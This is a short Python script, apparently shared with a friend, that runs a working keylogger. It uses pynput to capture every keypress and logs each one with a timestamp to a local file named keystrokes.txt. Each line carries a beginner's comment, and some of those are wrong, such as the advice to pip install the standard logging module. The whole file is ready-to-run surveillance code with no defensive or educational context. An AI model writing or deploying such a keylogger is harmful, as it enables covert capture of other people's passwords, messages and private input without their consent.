#      Code for my guy kitkat #

# all the imports are here
from pynput.keyboard import Key, Listener  # pip installpynput, pip install Listener
import logging     # pip install logging

log_dir = ""  # tells it where to save the file

logging.basicConfig(filename=(log_dir + "keystrokes.txt"),  #  saves the file to wherever the script is, with the name keystrokes
	level=logging.DEBUG, format='%(asctime)s: %(message)s')  # saves the date and time of a keystroke as well as the key

def on_press(key):     # defines that when a key is pressed...
    logging.info(str(key))  # # ... and then saves it with the date and time it was taken in the file

with Listener(on_press=on_press) as listener:  # uses listener to record a keypress, whenever a key is pressed
    listener.join()  # tells the listener to listen
